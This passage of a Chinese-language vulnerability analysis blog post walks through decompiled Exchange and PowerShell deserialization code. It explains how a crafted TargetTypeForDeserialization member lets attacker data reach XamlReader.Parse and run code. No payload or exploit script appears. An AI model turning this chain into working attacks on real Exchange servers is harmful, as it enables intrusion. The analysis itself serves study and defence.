</span></span></code></pre></div><p>(应该可以理解obj2为实现了Type这个抽象类的XamlReader对象，而XamlReader继承了Object这个父类，所以可以使用Object类型对象接受)</p><p>在调用栈内，ReadOneObject由ReadProperties调用，回到ReadProperties逻辑中，Exchange会将ReadOneObject返回的的Type类型的XamlReader对象添加到dso.adaptedMembers中，而后这个dso将会返回到调用栈内的ReadOneObject函数。</p><p><img alt=Untitled src=/images/vulnerability/proxy-not-shell.zh-cn.assets/9.png></p><p>继续调试，此时嵌套对象的内层对象已反序列化，开始反序列化外层对象，回到程序中，从下图可以看到，将会调用psobject.GetTargetTypeForDeserialization获取目标反序列化类型，此时psobject内的adaptedMembers内有名为TargetTypeForDeserialization的对象，其类型为Type的XamlReader对象</p><p><img alt=Untitled src=/images/vulnerability/proxy-not-shell.zh-cn.assets/10.png></p><p>进入到psobject.GetTargetTypeForDeserialization内，调用this.GetPSStandardMember试图获取PSMemberInfo 对象，而后将其强转为Type对象返回，若失败则返回null</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-csharp data-lang=csharp><span style=display:flex><span><span style=color:#66d9ef>internal</span> Type GetTargetTypeForDeserialization(TypeTable backupTypeTable)
</span></span><span style=display:flex><span>		{
</span></span><span style=display:flex><span>			PSMemberInfo psstandardMember = <span style=color:#66d9ef>this</span>.GetPSStandardMember(backupTypeTable, <span style=color:#e6db74>&#34;TargetTypeForDeserialization&#34;</span>);
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>if</span> (psstandardMember != <span style=color:#66d9ef>null</span>)
</span></span><span style=display:flex><span>			{
</span></span><span style=display:flex><span>				<span style=color:#66d9ef>return</span> psstandardMember.Value <span style=color:#66d9ef>as</span> Type;
</span></span><span style=display:flex><span>			}
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>return</span> <span style=color:#66d9ef>null</span>;
</span></span><span style=display:flex><span>		}
</span></span></code></pre></div><p>在GetPSStandardMember函数内，调用PSObject.TypeTableGetMemberDelegate并传入当前对象、允许的类型列表和硬编码PSStandardMembers以初始化PSMemberSet 对象。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-csharp data-lang=csharp><span style=display:flex><span><span style=color:#66d9ef>internal</span> PSMemberInfo GetPSStandardMember(TypeTable backupTypeTable, <span style=color:#66d9ef>string</span> memberName)
</span></span><span style=display:flex><span>		{
</span></span><span style=display:flex><span>			PSMemberInfo psmemberInfo = <span style=color:#66d9ef>null</span>;
</span></span><span style=display:flex><span>			TypeTable typeTable = (backupTypeTable != <span style=color:#66d9ef>null</span>) ? backupTypeTable : <span style=color:#66d9ef>this</span>.GetTypeTable();
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>if</span> (typeTable != <span style=color:#66d9ef>null</span>)
</span></span><span style=display:flex><span>			{
</span></span><span style=display:flex><span>				PSMemberSet psmemberSet = PSObject.TypeTableGetMemberDelegate&lt;PSMemberSet&gt;(<span style=color:#66d9ef>this</span>, typeTable, <span style=color:#e6db74>&#34;PSStandardMembers&#34;</span>);
</span></span><span style=display:flex><span>				<span style=color:#66d9ef>if</span> (psmemberSet != <span style=color:#66d9ef>null</span>)
</span></span><span style=display:flex><span>				{
</span></span><span style=display:flex><span>					psmemberSet.ReplicateInstance(<span style=color:#66d9ef>this</span>);
</span></span><span style=display:flex><span>					psmemberInfo = <span style=color:#66d9ef>new</span> PSMemberInfoIntegratingCollection&lt;PSMemberInfo&gt;(psmemberSet, PSObject.GetMemberCollection(PSMemberViewTypes.All, backupTypeTable))[memberName];
</span></span><span style=display:flex><span>				}
</span></span><span style=display:flex><span>			}
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>if</span> (psmemberInfo == <span style=color:#66d9ef>null</span>)
</span></span><span style=display:flex><span>			{
</span></span><span style=display:flex><span>				psmemberInfo = (<span style=color:#66d9ef>this</span>.InstanceMembers[<span style=color:#e6db74>&#34;PSStandardMembers&#34;</span>] <span style=color:#66d9ef>as</span> PSMemberSet);
</span></span><span style=display:flex><span>			}
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>return</span> psmemberInfo;
</span></span><span style=display:flex><span>		}
</span></span></code></pre></div><p><img alt=Untitled src=/images/vulnerability/proxy-not-shell.zh-cn.assets/11.png></p><p>而后调用PSMemberInfoIntegratingCollection构造函数，其中PSMemberInfoIntegratingCollection类继承了PSMemberInfo类。传入构造函数的collections变量来源于<code>PSObject.GetMemberCollection(PSMemberViewTypes.All, backupTypeTable)</code> 函数的返回值，构造函数将collections赋给当前对象的collections属性。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-csharp data-lang=csharp><span style=display:flex><span><span style=color:#66d9ef>internal</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>PSMemberInfoIntegratingCollection</span>&lt;T&gt; : PSMemberInfoCollection&lt;T&gt;, IEnumerable&lt;T&gt;, IEnumerable <span style=color:#66d9ef>where</span> T : PSMemberInfo
</span></span><span style=display:flex><span>	{
</span></span><span style=display:flex><span>		<span style=color:#75715e>// Token: 0x06002AC3 RID: 10947 RVA: 0x000C35F4 File Offset: 0x000C17F4</span>
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>private</span> <span style=color:#66d9ef>void</span> GenerateAllReservedMembers()
</span></span><span style=display:flex><span>		{
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>if</span> (!<span style=color:#66d9ef>this</span>.mshOwner.hasGeneratedReservedMembers)
</span></span><span style=display:flex><span>			{
</span></span><span style=display:flex><span>				<span style=color:#66d9ef>this</span>.mshOwner.hasGeneratedReservedMembers = <span style=color:#66d9ef>true</span>;
</span></span><span style=display:flex><span>				ReservedNameMembers.GeneratePSExtendedMemberSet(<span style=color:#66d9ef>this</span>.mshOwner);
</span></span><span style=display:flex><span>				ReservedNameMembers.GeneratePSBaseMemberSet(<span style=color:#66d9ef>this</span>.mshOwner);
</span></span><span style=display:flex><span>				ReservedNameMembers.GeneratePSObjectMemberSet(<span style=color:#66d9ef>this</span>.mshOwner);
</span></span><span style=display:flex><span>				ReservedNameMembers.GeneratePSAdaptedMemberSet(<span style=color:#66d9ef>this</span>.mshOwner);
</span></span><span style=display:flex><span>				ReservedNameMembers.GeneratePSTypeNames(<span style=color:#66d9ef>this</span>.mshOwner);
</span></span><span style=display:flex><span>			}
</span></span><span style=display:flex><span>		}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>internal</span> PSMemberInfoIntegratingCollection(<span style=color:#66d9ef>object</span> owner, Collection&lt;CollectionEntry&lt;T&gt;&gt; collections)
</span></span><span style=display:flex><span>		{
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>if</span> (owner == <span style=color:#66d9ef>null</span>)
</span></span><span style=display:flex><span>			{
</span></span><span style=display:flex><span>				<span style=color:#66d9ef>throw</span> PSTraceSource.NewArgumentNullException(<span style=color:#e6db74>&#34;owner&#34;</span>);
</span></span><span style=display:flex><span>			}
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>this</span>.mshOwner = (owner <span style=color:#66d9ef>as</span> PSObject);
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>this</span>.memberSetOwner = (owner <span style=color:#66d9ef>as</span> PSMemberSet);
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>if</span> (<span style=color:#66d9ef>this</span>.mshOwner == <span style=color:#66d9ef>null</span> &amp;&amp; <span style=color:#66d9ef>this</span>.memberSetOwner == <span style=color:#66d9ef>null</span>)
</span></span><span style=display:flex><span>			{
</span></span><span style=display:flex><span>				<span style=color:#66d9ef>throw</span> PSTraceSource.NewArgumentException(<span style=color:#e6db74>&#34;owner&#34;</span>);
</span></span><span style=display:flex><span>			}
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>if</span> (collections == <span style=color:#66d9ef>null</span>)
</span></span><span style=display:flex><span>			{
</span></span><span style=display:flex><span>				<span style=color:#66d9ef>throw</span> PSTraceSource.NewArgumentNullException(<span style=color:#e6db74>&#34;collections&#34;</span>);
</span></span><span style=display:flex><span>			}
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>this</span>.collections = collections;
</span></span><span style=display:flex><span>		}
</span></span></code></pre></div><p><img alt=Untitled src=/images/vulnerability/proxy-not-shell.zh-cn.assets/12.png></p><p>GetMemberCollection代码如下，其会将对象的<em>adaptedMembers</em>属性添加到列表中，而在内层对象反序列化时已经将名为TargetTypeForDeserialization的XamlReader类型的Type对象加入到<em>adaptedMembers</em>属性中。所以返回的列表内也会包含该对象。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-csharp data-lang=csharp><span style=display:flex><span><span style=color:#66d9ef>internal</span> <span style=color:#66d9ef>static</span> Collection&lt;CollectionEntry&lt;PSMemberInfo&gt;&gt; GetMemberCollection(PSMemberViewTypes viewType, TypeTable backupTypeTable)
</span></span><span style=display:flex><span>		{
</span></span><span style=display:flex><span>			Collection&lt;CollectionEntry&lt;PSMemberInfo&gt;&gt; collection = <span style=color:#66d9ef>new</span> Collection&lt;CollectionEntry&lt;PSMemberInfo&gt;&gt;();
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>if</span> ((viewType &amp; PSMemberViewTypes.Extended) == PSMemberViewTypes.Extended)
</span></span><span style=display:flex><span>			{
</span></span><span style=display:flex><span>				<span style=color:#66d9ef>if</span> (backupTypeTable == <span style=color:#66d9ef>null</span>)
</span></span><span style=display:flex><span>				{
</span></span><span style=display:flex><span>					collection.Add(<span style=color:#66d9ef>new</span> CollectionEntry&lt;PSMemberInfo&gt;(<span style=color:#66d9ef>new</span> CollectionEntry&lt;PSMemberInfo&gt;.GetMembersDelegate(PSObject.TypeTableGetMembersDelegate&lt;PSMemberInfo&gt;), <span style=color:#66d9ef>new</span> CollectionEntry&lt;PSMemberInfo&gt;.GetMemberDelegate(PSObject.TypeTableGetMemberDelegate&lt;PSMemberInfo&gt;), <span style=color:#66d9ef>true</span>, <span style=color:#66d9ef>true</span>, <span style=color:#e6db74>&#34;type table members&#34;</span>));
</span></span><span style=display:flex><span>				}
</span></span><span style=display:flex><span>				<span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>				{
</span></span><span style=display:flex><span>					collection.Add(<span style=color:#66d9ef>new</span> CollectionEntry&lt;PSMemberInfo&gt;((PSObject msjObj) =&gt; PSObject.TypeTableGetMembersDelegate&lt;PSMemberInfo&gt;(msjObj, backupTypeTable), (PSObject msjObj, <span style=color:#66d9ef>string</span> name) =&gt; PSObject.TypeTableGetMemberDelegate&lt;PSMemberInfo&gt;(msjObj, backupTypeTable, name), <span style=color:#66d9ef>true</span>, <span style=color:#66d9ef>true</span>, <span style=color:#e6db74>&#34;type table members&#34;</span>));
</span></span><span style=display:flex><span>				}
</span></span><span style=display:flex><span>			}
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>if</span> ((viewType &amp; PSMemberViewTypes.Adapted) == PSMemberViewTypes.Adapted)
</span></span><span style=display:flex><span>			{
</span></span><span style=display:flex><span>				**collection.Add(<span style=color:#66d9ef>new</span> CollectionEntry&lt;PSMemberInfo&gt;(<span style=color:#66d9ef>new</span> CollectionEntry&lt;PSMemberInfo&gt;.GetMembersDelegate(PSObject.AdapterGetMembersDelegate&lt;PSMemberInfo&gt;), <span style=color:#66d9ef>new</span> CollectionEntry&lt;PSMemberInfo&gt;.GetMemberDelegate(PSObject.AdapterGetMemberDelegate&lt;PSMemberInfo&gt;), <span style=color:#66d9ef>false</span>, <span style=color:#66d9ef>false</span>, <span style=color:#e6db74>&#34;adapted members&#34;</span>));**
</span></span><span style=display:flex><span>			}
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>if</span> ((viewType &amp; PSMemberViewTypes.Base) == PSMemberViewTypes.Base)
</span></span><span style=display:flex><span>			{
</span></span><span style=display:flex><span>				collection.Add(<span style=color:#66d9ef>new</span> CollectionEntry&lt;PSMemberInfo&gt;(<span style=color:#66d9ef>new</span> CollectionEntry&lt;PSMemberInfo&gt;.GetMembersDelegate(PSObject.DotNetGetMembersDelegate&lt;PSMemberInfo&gt;), <span style=color:#66d9ef>new</span> CollectionEntry&lt;PSMemberInfo&gt;.GetMemberDelegate(PSObject.DotNetGetMemberDelegate&lt;PSMemberInfo&gt;), <span style=color:#66d9ef>false</span>, <span style=color:#66d9ef>false</span>, <span style=color:#e6db74>&#34;clr members&#34;</span>));
</span></span><span style=display:flex><span>			}
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>return</span> collection;
</span></span><span style=display:flex><span>		}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>private</span> <span style=color:#66d9ef>static</span> T AdapterGetMemberDelegate&lt;T&gt;(PSObject msjObj, <span style=color:#66d9ef>string</span> name) <span style=color:#66d9ef>where</span> T : PSMemberInfo
</span></span><span style=display:flex><span>		{
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>if</span> (!msjObj.isDeserialized)
</span></span><span style=display:flex><span>			{
</span></span><span style=display:flex><span>				T t = msjObj.InternalAdapter.BaseGetMember&lt;T&gt;(msjObj.immediateBaseObject, name);
</span></span><span style=display:flex><span>				PSObject.memberResolution.WriteLine(<span style=color:#e6db74>&#34;Adapted member: {0}.&#34;</span>, (t == <span style=color:#66d9ef>null</span>) ? <span style=color:#e6db74>&#34;not found&#34;</span> : t.Name);
</span></span><span style=display:flex><span>				<span style=color:#66d9ef>return</span> t;
</span></span><span style=display:flex><span>			}
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>if</span> (msjObj.adaptedMembers == <span style=color:#66d9ef>null</span>)
</span></span><span style=display:flex><span>			{
</span></span><span style=display:flex><span>				<span style=color:#66d9ef>return</span> <span style=color:#66d9ef>default</span>(T);
</span></span><span style=display:flex><span>			}
</span></span><span style=display:flex><span>			T t2 = msjObj.adaptedMembers[name] <span style=color:#66d9ef>as</span> T;
</span></span><span style=display:flex><span>			PSObject.memberResolution.WriteLine(<span style=color:#e6db74>&#34;Serialized adapted member: {0}.&#34;</span>, (t2 == <span style=color:#66d9ef>null</span>) ? <span style=color:#e6db74>&#34;not found&#34;</span> : t2.Name);
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>return</span> t2;
</span></span><span style=display:flex><span>		}
</span></span></code></pre></div><p>返回到GetPSStandardMember函数中，Exchange会匹配构造函数返回的对象的memberName属性，该属性来源于GetTargetTypeForDeserialization调用时传递的硬编码TargetTypeForDeserialization，即将从该对象中检索名为TargetTypeForDeserialization的值，前面提到过列表内已有该名字的对象，所以将匹配到XamlReader类型的Type对象，并返回给上层函数。</p><p>返回到上层函数，GetTargetTypeForDeserialization返回了XamlReader类型。</p><p><img alt=Untitled src=/images/vulnerability/proxy-not-shell.zh-cn.assets/13.png></p><p>进入到ConvertTo函数内，valueToConvert为上层函数ReadOneObject函数传入的obj对象，其内包含了xaml反序列化的命令执行字符串。</p><p><img alt=Untitled src=/images/vulnerability/proxy-not-shell.zh-cn.assets/14.png></p><p>进入到LanguagePrimitives.FigureConversion在#3527处断点，此时fromType为String，toType为XamlReader</p><p><img alt=Untitled src=/images/vulnerability/proxy-not-shell.zh-cn.assets/15.png></p><p>进入FigureParseConversion内，将会通过反射获取到XamlReader的Parse方法。</p><p><img alt=Untitled src=/images/vulnerability/proxy-not-shell.zh-cn.assets/16.png></p><p><img alt=Untitled src=/images/vulnerability/proxy-not-shell.zh-cn.assets/17.png></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-csharp data-lang=csharp><span style=display:flex><span><span style=color:#66d9ef>private</span> <span style=color:#66d9ef>static</span> LanguagePrimitives.PSConverter&lt;<span style=color:#66d9ef>object</span>&gt; FigureParseConversion(Type fromType, Type toType)
</span></span><span style=display:flex><span>		{
</span></span><span style=display:flex><span>			.....
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> (fromType == <span style=color:#66d9ef>typeof</span>(<span style=color:#66d9ef>string</span>))
</span></span><span style=display:flex><span>			{
</span></span><span style=display:flex><span>				MethodInfo methodInfo = <span style=color:#66d9ef>null</span>;
</span></span><span style=display:flex><span>				<span style=color:#66d9ef>try</span>
</span></span><span style=display:flex><span>				{
</span></span><span style=display:flex><span>					methodInfo = toType.GetMethod(<span style=color:#e6db74>&#34;Parse&#34;</span>, BindingFlags.Static | BindingFlags.Public | BindingFlags.FlattenHierarchy, <span style=color:#66d9ef>null</span>, <span style=color:#66d9ef>new</span> Type[]
</span></span><span style=display:flex><span>					{
</span></span><span style=display:flex><span>						<span style=color:#66d9ef>typeof</span>(<span style=color:#66d9ef>string</span>),
</span></span><span style=display:flex><span>						<span style=color:#66d9ef>typeof</span>(IFormatProvider)
</span></span><span style=display:flex><span>					}, <span style=color:#66d9ef>null</span>);
</span></span><span style=display:flex><span>				}
</span></span><span style=display:flex><span>				<span style=color:#66d9ef>catch</span> (AmbiguousMatchException ex)
</span></span><span style=display:flex><span>				{
</span></span><span style=display:flex><span>					LanguagePrimitives.typeConversion.WriteLine(<span style=color:#e6db74>&#34;Exception finding Parse method with CultureInfo: \&#34;{0}\&#34;.&#34;</span>, ex.Message);
</span></span><span style=display:flex><span>				}
</span></span><span style=display:flex><span>				<span style=color:#66d9ef>catch</span> (ArgumentException ex2)
</span></span><span style=display:flex><span>				{
</span></span><span style=display:flex><span>					LanguagePrimitives.typeConversion.WriteLine(<span style=color:#e6db74>&#34;Exception finding Parse method with CultureInfo: \&#34;{0}\&#34;.&#34;</span>, ex2.Message);
</span></span><span style=display:flex><span>				}
</span></span><span style=display:flex><span>				<span style=color:#66d9ef>if</span> (methodInfo != <span style=color:#66d9ef>null</span>)
</span></span><span style=display:flex><span>				{
</span></span><span style=display:flex><span>					<span style=color:#66d9ef>return</span> <span style=color:#66d9ef>new</span> LanguagePrimitives.PSConverter&lt;<span style=color:#66d9ef>object</span>&gt;(<span style=color:#66d9ef>new</span> LanguagePrimitives.ConvertViaParseMethod
</span></span><span style=display:flex><span>					{
</span></span><span style=display:flex><span>						parse = methodInfo
</span></span><span style=display:flex><span>					}.ConvertWithCulture);
</span></span><span style=display:flex><span>				}
</span></span><span style=display:flex><span>				<span style=color:#66d9ef>try</span>
</span></span><span style=display:flex><span>				{
</span></span><span style=display:flex><span>					methodInfo = toType.GetMethod(<span style=color:#e6db74>&#34;Parse&#34;</span>, BindingFlags.Static | BindingFlags.Public | BindingFlags.FlattenHierarchy, <span style=color:#66d9ef>null</span>, <span style=color:#66d9ef>new</span> Type[]
</span></span><span style=display:flex><span>					{
</span></span><span style=display:flex><span>						<span style=color:#66d9ef>typeof</span>(<span style=color:#66d9ef>string</span>)
</span></span><span style=display:flex><span>					}, <span style=color:#66d9ef>null</span>);
</span></span><span style=display:flex><span>				}
</span></span><span style=display:flex><span>				<span style=color:#66d9ef>catch</span> (AmbiguousMatchException ex3)
</span></span><span style=display:flex><span>				{
</span></span><span style=display:flex><span>					LanguagePrimitives.typeConversion.WriteLine(<span style=color:#e6db74>&#34;Exception finding Parse method: \&#34;{0}\&#34;.&#34;</span>, ex3.Message);
</span></span><span style=display:flex><span>				}
</span></span><span style=display:flex><span>				<span style=color:#66d9ef>catch</span> (ArgumentException ex4)
</span></span><span style=display:flex><span>				{
</span></span><span style=display:flex><span>					LanguagePrimitives.typeConversion.WriteLine(<span style=color:#e6db74>&#34;Exception finding Parse method: \&#34;{0}\&#34;.&#34;</span>, ex4.Message);
</span></span><span style=display:flex><span>				}
</span></span><span style=display:flex><span>				<span style=color:#66d9ef>if</span> (methodInfo != <span style=color:#66d9ef>null</span>)
</span></span><span style=display:flex><span>				{
</span></span><span style=display:flex><span>					<span style=color:#66d9ef>return</span> <span style=color:#66d9ef>new</span> LanguagePrimitives.PSConverter&lt;<span style=color:#66d9ef>object</span>&gt;(<span style=color:#66d9ef>new</span> LanguagePrimitives.ConvertViaParseMethod
</span></span><span style=display:flex><span>					{
</span></span><span style=display:flex><span>						parse = methodInfo
</span></span><span style=display:flex><span>					}.ConvertWithoutCulture);
</span></span><span style=display:flex><span>				}
</span></span><span style=display:flex><span>			}
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>return</span> <span style=color:#66d9ef>null</span>;
</span></span><span style=display:flex><span>		}
</span></span></code></pre></div><p>XamlReader.Parse方法将会由LanguagePrimitives.ConvertViaParseMethod.ConvertWithoutCulture方法调用。之后就是普通的反序列化过程了。</p><h3 id=小结>小结</h3><p>这个漏洞利用链核心是如何绕过Exchange黑名单类并使Exchange将攻击者控制的指定数据反序列化到指定危险类造成代码执行。</p><p>漏洞利用了Exchange的合法功能，先构造了名为targetTypeForDeserialization 的XamlReader类型的Type对象序列化值，利用Microsoft.Exchange.Data.SerializationTypeConverter的特性返回了XamlReader类型的Type对象，而后ReadProperties将其加入到adaptedMember内。在外层对象反序列化时，构造的PSMembers包含了名为targetTypeForDeserialization的XamlReader类型的Type对象，Exchange会在PSMembers列表内匹配targetTypeForDeserialization项，从而控制了ConvertTo函数转化的目标类XamlReader，Exchange通过反射获取到了XamlReader的Parse方法，调用该方法反序列化攻击者可控的序列化数据，触发代码执行。</p><p>在调试过程中需要将.NET Framework的优化关掉以便dnSpy调试</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-csharp data-lang=csharp><span style=display:flex><span><span style=color:#a6e22e>[.NET Framework Debugging Control]</span>
</span></span><span style=display:flex><span>GenerateTrackingInfo=<span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>AllowOptimize=<span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>COMPlus_ZapDisable=<span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>COMPlus_ReadyToRun=<span style=color:#ae81ff>0</span>
</span></span></code></pre></div><p><strong>其他</strong></p><p>PSRP：PowerShell Remote Protocol powerShell远程协议，是微软提供的通过SOAP协议上执行PowerShell代码的协议</p><p>参考资料</p><blockquote><p><a href=https://www.zerodayinitiative.com/blog/2022/11/14/control-your-types-or-get-pwned-remote-code-execution-in-exchange-powershell-backend target=_blank>https://www.zerodayinitiative.com/blog/2022/11/14/control-your-types-or-get-pwned-remote-code-execution-in-exchange-powershell-backend</a></p></blockquote><blockquote><p><a href=https://www.zerodayinitiative.com/blog/2021/8/17/from-pwn2own-2021-a-new-attack-surface-on-microsoft-exchange-proxyshell target=_blank>https://www.zerodayinitiative.com/blog/2021/8/17/from-pwn2own-2021-a-new-attack-surface-on-microsoft-exchange-proxyshell</a></p></blockquote><p><strong>Created at 2023-05-05T20:35:49+08:00</strong></p><div class=article-container></div><script src=https://utteranc.es/client.js repo=CppXL/blog_comment issue-term=pathname theme=github-light crossorigin=anonymous async></script></div><div id=comments></div><footer class=footline></footer></div></div><div id=navigation><a class="nav nav-prev" href=/zh-cn/vulnerability/cve-2023-28432-minio-information-disclosure/ title="CVE-2023-28432 MinIO 信息泄露漏洞分析"><i class="fa fa-chevron-left"></i></a>
<a class="nav nav-next" href=/zh-cn/vulnerability/cve-2021-40449-win32k-eop/ title="CVE-2021-40449 Win32k 权限提升漏洞分析" style=margin-right:0><i class="fa fa-chevron-right"></i></a></div></section><div style=left:-1000px;overflow:scroll;position:absolute;top:-1000px;border:none;box-sizing:content-box;height:200px;margin:0;padding:0;width:200px><div style=border:none;box-sizing:content-box;height:200px;margin:0;padding:0;width:200px></div></div><script src=/js/clipboard.min.js?1701075322></script><script src=/js/perfect-scrollbar.min.js?1701075322></script><script src=/js/perfect-scrollbar.jquery.min.js?1701075322></script><script src=/js/jquery.sticky.js?1701075322></script><script src=/js/featherlight.min.js?1701075322></script><script src=/js/highlight.pack.js?1701075322></script><script>hljs.initHighlightingOnLoad()</script><script src=/js/modernizr.custom-3.6.0.js?1701075322></script><script src=/js/learn.js?1701075322></script><script src=/js/hugo-learn.js?1701075322></script><script src=/mermaid/mermaid.js?1701075322></script><script>mermaid.initialize({startOnLoad:!0})</script><script>(function(e,t,n,s,o,i,a){e.GoogleAnalyticsObject=o,e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date,i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)})(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-105947713-1","auto"),ga("send","pageview")</script></body></html>